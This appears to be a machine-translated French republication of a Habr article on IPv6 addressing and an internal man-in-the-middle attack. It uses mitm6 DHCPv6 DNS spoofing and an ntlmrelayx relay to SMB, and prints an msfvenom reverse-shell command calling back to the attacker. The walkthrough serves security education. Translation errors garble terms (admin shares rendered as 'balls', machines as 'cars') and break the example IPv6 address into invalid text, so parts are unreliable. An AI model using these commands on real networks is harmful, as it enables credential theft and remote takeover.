<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🧘🏻 👩🏾‍🤝‍👩🏼 🤝 Où insérer un guillemet dans IPv6 🤱🏽 🤸🏼 🚗</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="IPv6 est une nouvelle version du protocole Internet. Les membres de l'IETF l'ont accepté il y a seulement 22 ans, en 1996. Pendant ce temps, des attaq...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Où insérer un guillemet dans IPv6</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pm/blog/417285/"> IPv6 est une nouvelle version du protocole Internet.  Les membres de l'IETF l'ont accepté il y a seulement 22 ans, en 1996.  Pendant ce temps, des attaques IPv6 spécifiques ont réussi à apparaître.  Le but de cet article, basé sur notre présentation à <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">PHDays 8,</a> est de montrer les possibilités d'une attaque sur les réseaux d'entreprise par un intrus interne utilisant IPv4 et IPv6. <br><br><img src="https://habrastorage.org/webt/ls/nb/b7/lsnbb7p7odub6aicoy6uylbvcak.png"><br><a name="habracut"></a><br><h2>  Bases de l'adressage IPv6 </h2><br>  La longueur de l'adresse IPv6 est de 128 bits, qui sont écrits au format hexadécimal avec la division de l'adresse entière en 8 groupes.  Un exemple d'écriture d'une adresse IPv6: <br><br>  2001: 0a00: café: bébé: 0001: 0000: 0000: 0011/64 <br><br>  Il existe un enregistrement d'adresse simplifié lorsque plusieurs groupes de zéros suivants peuvent être remplacés par «::», mais une seule fois.  Les zéros écrits à gauche dans chaque groupe peuvent être supprimés.  Ainsi, l'adresse ci-dessus peut être écrite comme suit: <br><br>  2001: a00: café: bébé: 1 :: 11/64 <br><br>  La taille standard de la partie hôte délivrée par le fournisseur au client est de 64 bits, dont 4 sont utilisés pour segmenter le réseau en sous-réseaux. <br><br><img src="https://habrastorage.org/webt/ae/0r/2b/ae0r2bmvkfpwm8bvbwdlui_560i.png"><br><br>  Il existe plusieurs types d'adresses dans IPv6: <br><br><img src="https://habrastorage.org/webt/cr/e2/zz/cre2zzzair09k_qyg-ozm_olyno.png"><br>  <b>La monodiffusion globale</b> est un analogue des adresses publiques en IPv4.  Ces adresses sont émises par l' <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">IANA</a> et sont uniques sur Internet.  Ces adresses sont dans la plage 2000 :: / 3 (2000 - 3FFF). <br><br>  <b>Adresses locales (Link-local)</b> - les adresses de la plage FE80 :: / 10 (FE80 - FEBF) sont générées automatiquement par les appareils et sont utilisées pour interagir avec d'autres appareils sur le même réseau local.  Le trafic contenant cette adresse en tant qu'expéditeur ou destinataire ne doit pas être acheminé.  Ainsi, un périphérique qui prend en charge IPv6 et est connecté au réseau peut immédiatement échanger des informations au sein de son sous-réseau sans aucune configuration. <br><br>  <b>Adresse de bouclage :: 1</b> .  Cette adresse est similaire à 127.0.0.1 dans IPv4.  Les paquets qui lui sont envoyés ne quittent pas l'appareil. <br><br>  <b>Adresse non spécifiée</b> - l'adresse "::", composée uniquement de zéros.  Il est utilisé dans certains cas comme expéditeur jusqu'à la réception de l'adresse. <br><br>  <b>Adresses locales uniques (Local unique)</b> - un analogue des adresses privées dans IPv4, peuvent être routées au sein du réseau interne de l'organisation, sans possibilité de routage vers Internet.  L'espace d'adressage IPv6 est si grand que plus d'un billion d'adresses peuvent être délivrées à chaque personne sur la planète et elles ne se termineront pas.  Par conséquent, IPv6 implique l'abandon des adresses privées dans le sens où elles ont été utilisées dans IPv4 en raison d'un manque d'adresses publiques. <br><br>  <b>Adresses IPv4 mappées sur IPv6 (IPv4 intégré)</b> - Adresses IPv6 commençant par :: ffff: les 32 derniers bits contiennent une adresse IPv4 (:: ffff: xxxx: xxxx, où xxxx: xxxx est l'adresse IPv4 convertie en hexadécimal).  Ces adresses sont utilisées pour les périphériques qui ne prennent pas en charge IPv6 et fournissent un moyen de mapper un espace d'adressage IPv4 à un espace d'adressage IPv6. <br><br>  <b>Adresses de multidiffusion (multidiffusion)</b> - l'un des principaux changements dans IPv6 par rapport à IPv4.  Le nouveau protocole a refusé les paquets de diffusion, au lieu de l'adresse de diffusion, les adresses de multidiffusion sont utilisées.  Toutes ces adresses sont dans la gamme FF00 :: / 8 <br><br><img src="https://habrastorage.org/webt/gw/io/c6/gwioc6toxuatii_wzugt5yb3j2w.png"><br><br><h3>  Attribution d'adresse IPv6 </h3><br>  IPv6 utilise le protocole de découverte de voisinage (ND) ICMPv6 pour obtenir les informations d'adresse.  Comme le montre la figure ci-dessous, lorsqu'un nouveau périphérique apparaît sur le réseau IPv6, le périphérique envoie une demande pour obtenir une adresse IPv6 (sollicitation de routeur) à «ff02 :: 2» (tous les routeurs réseau).  Le routeur répond avec un message (Annonce du routeur) contenant des informations sur la façon d'obtenir l'adresse IPv6.  Selon les indicateurs définis dans le message, il existe trois façons: <br><table><tbody><tr><th>  Manière d'obtenir l'adresse </th><th>  Un indicateur (Auto) </th><th>  Drapeau O (autre) </th><th>  Drapeau M (géré) </th></tr><tr><td>  SLAAC (par défaut) </td><td>  1 </td><td>  0 </td><td>  0 </td></tr><tr><td>  SLAAC + DHCPv6 </td><td>  1 </td><td>  1 </td><td>  0 </td></tr><tr><td>  DHCPv6 </td><td>  0 </td><td>  - </td><td>  1 </td></tr></tbody></table><br>  <b>SLAAC</b> (Stateless Address Autoconfiguration) - Dans ce cas, tout ce qui est nécessaire pour générer une adresse IPv6 globale se trouve dans le message RA. <br><br>  <b>SLAAC + DHCPv6</b> - Comme dans le cas de SLAAC, l'adresse est générée en fonction des informations contenues dans le paquet RA, mais l'indicateur O est également défini, ce qui signifie Autre configuration, et l'appareil doit contacter le serveur DHCPv6 pour obtenir des paramètres supplémentaires, par exemple, le serveur DNS. <br><br>  <b>DHCPv6</b> est un analogue de l'adresse DHCPv4 et toutes les autres informations sont émises par le serveur DHCP, à l'exception de la passerelle par défaut, qui est extraite de l'adresse de l'expéditeur du paquet RA. <br><br>  Lorsque les indicateurs O et M sont définis en même temps, l'indicateur O est ignoré. <br><br><img src="https://habrastorage.org/webt/qx/nh/yw/qxnhywmpu6bpogmnss7c0emprpa.jpeg"><br>  Par exemple, prenez l'utilitaire fake_router26 de la suite d'utilitaires thc <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">-ipv6</a> .  L'image montre qu'après le démarrage, l'adresse IPv6 de la passerelle par défaut a été ajoutée, ce qui est devenu prioritaire par rapport à IPv4. <br><br><img src="https://habrastorage.org/webt/mr/qc/45/mrqc45-7fxz_clcr6affsl69i9e.png"><br><br><h2>  Attaque! </h2><br>  Dans ce scénario, nous considérerons la possibilité d'une attaque de l'homme du milieu en utilisant le mécanisme d'obtention des paramètres réseau IPv6. <br><br>  Pour la démonstration, nous avons besoin de 4 voitures: <br><br>  <b>La machine attaquante est</b> Kali Linux. <br><br><img src="https://habrastorage.org/webt/2z/rj/2p/2zrj2parlezr5m5thp1abcskgxo.png"><br><br>  <b>La machine serveur</b> sur laquelle les boules d'administration de Windows 7 seront activées. <br><br><img src="https://habrastorage.org/webt/tl/n3/qj/tln3qjafwp_zhancgxbpogpd5u4.png"><br><br>  <b>Un ordinateur client</b> qui aura accès à un serveur Windows 7. <br><br><img src="https://habrastorage.org/webt/ob/vb/82/obvb82baad3u7bd4cmjlm-54atc.png"><br><br>  Un routeur avec DHCPv4 activé. <br><br>  dirkjanm a décrit la <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">méthodologie de</a> ce scénario.  Il a écrit l'utilitaire mitm6, qui, en utilisant le protocole ND, envoie des messages de publicité de routeur avec les drapeaux «O» et «M» définis sur «1».  Ainsi, les clients savent qu'il est nécessaire de demander des informations d'adresse à un serveur DHCPv6.  Les clients commencent à envoyer des messages DHCPv6 SOLICIT pour découvrir le serveur DHCP.  L'utilitaire répond aux demandes avec des messages DHCPv6 ADVERTISE;  la réponse contient l'adresse de la machine attaquante en tant que serveur DNS. <br><br><img alt="Demande d'informations d'adresse envoyée à l'adresse de multidiffusion de tous les serveurs DHCP ff02 :: 1: 2" src="https://habrastorage.org/webt/ze/if/di/zeifdiuqvmjxgmsakw5nz5dqqau.png"><br><br>  Après cela, en raison des caractéristiques architecturales du système d'exploitation, le DNS DHCPv6 devient une priorité.  Désormais, l'attaquant peut répondre à toutes les requêtes DNS avec la bonne adresse.  Ainsi, la demande envoyée par le nom de domaine sera envoyée à la discrétion de l'attaquant. <br><br>  En exécutant mitm6, vous pouvez spécifier le domaine pour lequel remplacer les adresses DNS. <br><br><img src="https://habrastorage.org/webt/cj/b5/mt/cjb5mthduecqu62-iig9ed9u24w.png"><br><br><img src="https://habrastorage.org/webt/ox/bz/bu/oxbzbuxhk777trjsfvr4idkkgdw.png"><br><br><h2>  Balles d'administration </h2><br>  Pour améliorer l'effet dramatique, supposons qu'il existe une autre machine sur le réseau sur laquelle l'utilisateur de la première machine est autorisé à se connecter aux boules administratives.  Par défaut, ils sont désactivés, mais sur Internet, beaucoup de gens souhaitent savoir comment les activer et sont très heureux lorsqu'ils l'obtiennent. <br><br><img src="https://habrastorage.org/webt/gi/yj/qt/giyjqt4gwprslmxgsgc_i2b_5_k.jpeg"><br><br><img src="https://habrastorage.org/webt/d-/gg/mp/d-ggmpf_b9oztu5dfrotewmbw9o.png"><br><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">WPAD</a> (Web Proxy Auto Discovery) est un protocole permettant de déterminer l'emplacement du fichier dans lequel se trouvent les paramètres de proxy par défaut. <br><br>  Après la mise à jour de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">MS16-077, le</a> wpad n'est plus fourni via NETBIOS et n'est pas authentifié automatiquement sur le serveur proxy. <br><br>  Pour contourner ces restrictions, vous pouvez utiliser ntlmrelayx.py, qui fait partie de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">impacket</a> .  Une version supérieure à 0.9.16 est requise, qui inclut la prise en charge IPv6 et la possibilité d'installer un serveur qui rend un wpad valide.  Le lancement se fait par l'équipe <br><br><pre><code class="bash hljs">ntlmrelayx.py -6 -wh at.localdomain -t smb://192.168.56.7 -e 1.exe</code> </pre> <br>  où 1.exe est la charge utile du shell inversé générée par le métasplit. <br><br><pre> <code class="bash hljs">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.6 LPORT=444 -f exe -o 1.exe</code> </pre> <br>  le paramètre -wh indique l'hôte où se trouve le fichier wpad (l'utilitaire mitm6 répondra avec l'adresse de l'attaquant à cette demande) <br><br><img src="https://habrastorage.org/webt/4e/ew/hh/4eewhhpvwjynispsnazoyftxtus.png"><br><br><img src="https://habrastorage.org/webt/p1/it/aa/p1itaa9idtzcavemj45sgzsbeeq.png"><br><br>  Après la connexion, l'authentification HTTP 407 (authentification proxy requise) sera demandée, auprès de laquelle le navigateur sera automatiquement authentifié. <br><br><img src="https://habrastorage.org/webt/fw/hn/qz/fwhnqzgqri-snconlo2sdpubcmc.png"><br><br><img src="https://habrastorage.org/webt/f5/hf/1x/f5hf1xuyeourcueod8v70dqilsa.png"><br><br>  Les données reçues seront utilisées pour se connecter au smb du serveur attaqué, passé par le paramètre -t. <br><br><img src="https://habrastorage.org/webt/xa/hu/0e/xahu0errtgiiuzu9j_b1990pryq.png"><br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/WO2jeo85Mpg" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><br>  Je remercie mon co-auteur Sergey Ovchinnikov <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" class="user_link">malchikserega</a> pour son aide dans la préparation de la présentation et de l'article. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr417285/">https://habr.com/ru/post/fr417285/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr417271/index.html">Un pirate peut-il bloquer la Manche?</a></li>
<li><a href="../fr417273/index.html">Réalisation d'un guide vocal basé sur YandexSpeechKit</a></li>
<li><a href="../fr417275/index.html">7 compétences de designers efficaces. De puissants outils de développement de carrière</a></li>
<li><a href="../fr417277/index.html">Bibliothèques gratuites pour créer et éditer des fichiers PDF</a></li>
<li><a href="../fr417283/index.html">Disney a présenté son propre système d'animation capillaire HairControl</a></li>
<li><a href="../fr417287/index.html">"Calendrier des testeurs" pour juillet. Tests analytiques</a></li>
<li><a href="../fr417289/index.html">Journal du stagiaire: Jour 1. Stagiaire à junior</a></li>
<li><a href="../fr417293/index.html">Récupération de mot de passe et stockage principal dans le cloud, ou Nouveautés de Zimbra 8.8.9</a></li>
<li><a href="../fr417295/index.html">Comment ai-je écrit la bibliothèque C ++ 11 standard ou pourquoi boost est si effrayant. Chapitre 3</a></li>
<li><a href="../fr417297/index.html">Fear and Loathing Threat Intelligence or 8 TI Practical Tips</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>